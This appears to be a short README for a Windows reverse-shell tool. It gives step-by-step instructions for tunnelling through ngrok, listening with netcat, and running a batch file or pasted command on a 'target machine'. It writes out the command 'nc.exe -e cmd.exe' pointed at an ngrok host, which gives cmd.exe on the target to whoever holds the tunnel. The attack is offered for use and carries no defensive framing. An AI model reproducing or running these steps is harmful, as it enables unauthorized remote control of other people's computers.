# Simple-Reverse-Shell-Windows
Simple reverse shell Windows CMD with Netcat and Ngrok

# How To Use
  For example:
  1. run "ngrok tcp 6969"
  2. run netcat "nc -lvnp 6969"
  3. edit RShell.bat and put your ngrok ip and port, should be like this "....\\nc.exe -e cmd.exe 0.tcp.ngrok.io 27384"
  4. Then run RShell.bat on your target machine. 
     OR YOU CAN JUST COPY THE CODE AND PASTE ON CMD OR POWERSHELL IN YOUR TARGET MACHINE. :)
